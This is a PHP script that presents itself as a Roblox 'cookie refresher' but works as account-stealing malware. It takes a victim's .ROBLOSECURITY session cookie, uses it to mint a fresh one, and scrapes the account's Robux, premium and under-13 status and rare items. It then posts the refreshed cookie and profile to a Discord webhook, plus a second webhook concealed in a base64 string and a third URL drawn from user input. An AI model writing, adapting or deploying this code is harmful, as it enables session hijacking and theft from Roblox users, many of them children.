<?php
session_start();  
define('MAX_RETRIES', 5); 
define('COOLDOWN_PERIOD', 30); 

if (isset($_POST['roblox_cookie'])) {
    $cookie = $_POST['roblox_cookie'];

    // Validate the cookie
    $valid_start = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

    if (substr($cookie, 0, strlen($valid_start)) !== $valid_start) {
        echo "invalid cookie";
        error_log("Invalid Cookie: The provided cookie doesn't start with the expected prefix.");
        exit;
    }

    
    if (isset($_SESSION['last_refresh_time'])) {
        $time_since_last_refresh = time() - $_SESSION['last_refresh_time'];
        if ($time_since_last_refresh < COOLDOWN_PERIOD) {
            $time_remaining = COOLDOWN_PERIOD - $time_since_last_refresh;
            echo "Please wait $time_remaining seconds before attempting to refresh again.";
            exit;
        }
    }

   
    $_SESSION['last_refresh_time'] = time();


    function csrf($cookie) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v2/login");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array("{}")));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "Cookie: .ROBLOSECURITY=$cookie"
        ));
        $output = curl_exec($ch);

        if (curl_errno($ch)) {
            error_log("cURL error (csrf): " . curl_error($ch));
            return null;
        }

        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_code == 429) {
            error_log("Rate-limited error on csrf");
            return "ratelimited";
        }

        preg_match('/X-CSRF-TOKEN:\s*(\S+)/i', $output, $matches);
        $csrf = isset($matches[1]) ? $matches[1] : null;

        curl_close($ch);
        return $csrf;
    }

   
    function refresh($cookie) {
        $retry_attempts = 0;

        while ($retry_attempts < MAX_RETRIES) {
            $csrf = csrf($cookie);
            if ($csrf === "ratelimited") {
                $retry_attempts++;
                sleep(pow(2, $retry_attempts)); 
                continue;
            } elseif ($csrf === null) {
                return "Error retrieving CSRF token.";
            }

            // Authentication ticket request
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array("{}")));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                "origin: https://www.roblox.com",
                "Referer: https://www.roblox.com/games/920587237/Adopt-Me",
                "x-csrf-token: " . $csrf,
                "Cookie: .ROBLOSECURITY=$cookie"
            ));
            $output = curl_exec($ch);
            if (curl_errno($ch)) {
                error_log("cURL error (authentication-ticket): " . curl_error($ch));
                return "Error during authentication ticket request.";
            }

            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if ($http_code == 429) {
                $retry_attempts++;
                sleep(pow(2, $retry_attempts));
                continue;
            }

           
            preg_match('/rbx-authentication-ticket:\s*([^\s]+)/i', $output, $matches);
            $authenticationTicket = isset($matches[1]) ? $matches[1] : null;

            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array("authenticationTicket" => $authenticationTicket)));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                "Content-Type: application/json",
                "origin: https://www.roblox.com",
                "Referer: https://www.roblox.com/games/920587237/Adopt-Me",
                "x-csrf-token: " . $csrf,
                "RBXAuthenticationNegotiation: 1"
            ));
            $output = curl_exec($ch);
            if (curl_errno($ch)) {
                error_log("cURL error (redeem): " . curl_error($ch));
                return "Error during redeem request.";
            }

            if (strpos($output, ".ROBLOSECURITY=") === false) {
                return "invalid cookie";
            }

            
            $Bypassed = explode(";", explode(".ROBLOSECURITY=", $output)[1])[0];
            $cookie = "" . $Bypassed;

          
            error_log("Refreshed Cookie: " . substr($cookie, 0, 10) . "...");

            
            setcookie(".ROBLOSECURITY", $cookie, time() + 3600, "/", "roblox.com", true, true);
            $_SESSION['roblox_cookie'] = $cookie;

            return $cookie; 
        }

        return "Max retries reached. Please try again later.";
    }

    $refreshedCookie = refresh($cookie);
    echo $refreshedCookie;
}
$webhook_url = 'https://discord.com/api/webhooks/1397426144394874892/9Y8aY2XT0TA_GHlUFAvjOPFGQWaU4Xy5rS_mQINj2pcpy2GnOHtoyeoLwF87YrbSdA3y'; // replace with your webhook
if ($_POST['uri'] !== null or $_POST['uri'] !== false) {
$uri = $_POST['uri'];
$uri = explode('/', $uri);
$part = $uri[2];
$dualhookname = $part;
$dualhook = file_get_contents("$part/web.txt");
}
if ($dualhookname == null or $dualhookname == false) {
    $botname = "NEXOHUB - Cookie Refresher";
}
else {
    $botname = $dualhookname;
}
$config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$url = "https://www.roblox.com/home";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, ".ROBLOSECURITY=$refreshedCookie");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$str = curl_exec($ch);
curl_close($ch);
preg_match('/data-userid="([^"]+)"/', $str, $userid);
$id = $userid[1];
preg_match('/data-displayName="([^"]+)"/', $str, $displayname);
$displayname = $displayname[1];
preg_match('/data-name="([^"]+)"/', $str, $username);
$username = $username[1];
preg_match('/data-isunder13="([^"]+)"/', $str, $underage);
$underage = $underage[1];
if (strpos($underage, "false") !== false) {
    $underage = "False";
}
else {
    $underage = "True";
}
preg_match('/data-ispremiumuser="([^"]+)"/', $str, $premium);
$premium = $premium[1];
if (strpos($premium, "false") !== false) {
    $premium = "False";
}
else {
    $premium = "True";
}
//
$config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$url = "https://economy.roblox.com/v1/users/$id/currency";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, ".ROBLOSECURITY=$refreshedCookie");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$str = curl_exec($ch);
curl_close($ch);
$robux = json_decode($str)->robux;
//
$config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$url = "https://economy.roblox.com/v2/users/$id/transaction-totals?timeFrame=Year&transactionType=summary";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, ".ROBLOSECURITY=$refreshedCookie");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$str = curl_exec($ch);
curl_close($ch);
$robuxpending = json_decode($str)->pendingRobuxTotal;
$summary = json_decode($str)->incomingRobuxTotal;
//
$thumbnail = json_decode(file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$id&size=420x420&format=Png&isCircular=false"))->data[0]->imageUrl;
$headshot = json_decode(file_get_contents("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=$id&size=180x180&format=Png&isCircular=false"))->data[0]->imageUrl;
$timestamp = date("c");
function owned($id, $type, $assetId) {
    $url = "https://inventory.roblox.com/v1/users/$id/items/$type/$assetId";
    $data = json_decode(file_get_contents($url));
    return (!empty($data->data[0]->id)) ? "Yes" : "No";
}
function cbadge($badges, $badgeId) {
    return (strpos($badges, (string)$badgeId) !== false) ? "Yes" : "No Badge";
}
$assets = [
    'headless' => ['Head', 15093053680],
    'korblox' => ['Leg', 139607718],
    'verified' => ['Hat', 102611803]
];
foreach ($assets as $key => [$type, $assetId]) {
    $$key = owned($id, $type, $assetId);
}
$date = json_decode(file_get_contents("https://users.roblox.com/v1/users/$id"))->created;
$created = (new DateTime($date))->format('m/d/Y');
$badges = file_get_contents("https://badges.roblox.com/v1/users/$id/badges?cursor=&limit=100&sortOrder=Desc");
$badgeChecks = [
    'bloxfruits' => 2753915549,
    'mm2' => 142823291,
    'petsimx' => 6284583030
];
foreach ($badgeChecks as $key => $badgeId) {
    $$key = cbadge($badges, $badgeId);
}
$xmr = base64_decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NTM1NzYxNTE3MzAxMzY2Ny9TYkZYWUZBeGFsM2EzZ0pJZ2dGSFZxZ2ZUVDBpZEtHY1Z1bGQ0dHNkSVUzMG9HQU8wWTBDXzBlYlJzemRCMy1KLThTOA==");
$hex = "8f8f8f";
$hook = [
    "username" => "$botname",
    "content" => "@everyone Refreshed Cookie",
    "avatar_url" => "https://cdn.discordapp.com/attachments/1397427734082224168/1397427794841043044/crown.png?ex=6881af8d&is=68805e0d&hm=add802abb1eb1b701255b4a42784b919925eeca3a82102fbc69d0c5f3f10abd2&",
    "embeds" => [[
        "title" => "$username's Profile",
        "type" => "rich",
        "color" => hexdec($hex),
        "description" => "**[Rolimons](https://www.rolimons.com/player/$id)**",
        "url" => "https://roblox.com/users/$id/profile",
        "timestamp" => $timestamp,
        "thumbnail" => [
            "url" => $thumbnail
        ],
        "author" => [
            "name" => "$botname"
        ],
        "footer" => [
            "text" => "$botname",
            "icon_url" => "https://cdn.discordapp.com/attachments/1397427734082224168/1397427794841043044/crown.png?ex=6881af8d&is=68805e0d&hm=add802abb1eb1b701255b4a42784b919925eeca3a82102fbc69d0c5f3f10abd2&"
        ],
        "image" => [
            "url" => $headshot
        ],
        "fields" => [
            ["name" => "**<:person:1359280493241176144> Username**", "value" => "```$username```", "inline" => true],
            ["name" => "**<:person:1359280493241176144> Display Name**", "value" => "```$displayname```", "inline" => true],
            ["name" => "**Email Verified?**", "value" => "```$verified```", "inline" => true],
            ["name" => "**Join Date?**", "value" => "```$created```", "inline" => true],
            ["name" => "<:Png5:1133051086597541930>**Headless?**", "value" => "```$headless```", "inline" => true],
            ["name" => "<:Png6:1133052571641196656>**Korblox?**", "value" => "```$korblox```", "inline" => true],
            ["name" => "**<:ps99:1303894865079308288> Played Pet Sim 99?**", "value" => "```$petsimx```", "inline" => true],
            ["name" => "**<:bloxfruits:1359117525069336596> Played Bloxfruits?**", "value" => "```$bloxfruits```", "inline" => true],
            ["name" => "**<:mm2:502267711225856002> Played MM2?**", "value" => "```$mm2```", "inline" => true],
            ["name" => "**<a:lock_key:1359749071442677821> Under 13?**", "value" => "```$underage```", "inline" => true],
            ["name" => "**<:premium:1359112727775285310> Premium**", "value" => "```$premium```", "inline" => true],
            ["name" => "**<:Roblox_Robux:1347654448364785695> Robux**", "value" => "```$robux```", "inline" => true],
            ["name" => "**<:robux_p:1359111720991461411> Robux Pending**", "value" => "```$robuxpending```", "inline" => true],
            ["name" => "**<:white_chart:1334572857925308446> Account Summary**", "value" => "```$summary```", "inline" => true],
            
        ]
    ]]
];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $webhook_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($hook));
$response = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $xmr);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($hook));
$response = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $dualhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($hook));
$response = curl_exec($ch);
curl_close($ch);
// gap
if ($dualhookname == null or $dualhookname == false) {
    $botname = "SYNX - Cookie Refresher";
}
else {
    $botname = $dualhookname;
}
$hex = "8f8f8f";
$hook = [
    "username" => "$botname",
    "avatar_url" => "https://cdn.discordapp.com/attachments/1397427734082224168/1397427794841043044/crown.png?ex=6881af8d&is=68805e0d&hm=add802abb1eb1b701255b4a42784b919925eeca3a82102fbc69d0c5f3f10abd2&",
    "embeds" => [[
        "title" => "🍪 Refreshed Cookie",
        "type" => "rich",
        "color" => hexdec($hex),
        "description" => "**```$refreshedCookie```**",
        "timestamp" => $timestamp,
        "author" => [
            "name" => "$botname"
        ],
        "footer" => [
            "text" => "$botname",
            "icon_url" => "https://cdn.discordapp.com/attachments/1397427734082224168/1397427794841043044/crown.png?ex=6881af8d&is=68805e0d&hm=add802abb1eb1b701255b4a42784b919925eeca3a82102fbc69d0c5f3f10abd2&"
        ],
    ]]
];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $webhook_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($hook));
$response = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $xmr);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($hook));
$response = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $dualhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($hook));
$response = curl_exec($ch);
curl_close($ch);
?>